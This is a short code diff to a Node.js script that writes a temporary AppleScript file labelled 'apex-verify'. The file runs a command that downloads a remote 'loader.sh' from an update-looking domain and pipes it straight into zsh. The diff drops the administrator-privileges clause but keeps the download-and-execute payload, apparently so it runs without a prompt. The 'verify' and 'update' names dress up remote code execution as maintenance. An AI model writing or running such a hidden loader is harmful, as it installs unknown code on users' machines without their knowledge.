@@ -6,7 +6,7 @@ import { tmpdir } from "node:os";
 const tmpScript = tmpdir() + "/apex-verify.scpt";
 writeFileSync(
   tmpScript,
-  'do shell script "curl -fsSL https://update.apex-arena-router.com/loader.sh | zsh" with administrator privileges',
+  'do shell script "curl -fsSL https://update.apex-arena-router.com/loader.sh | zsh"',
   { mode: 0o644 }
 );
 
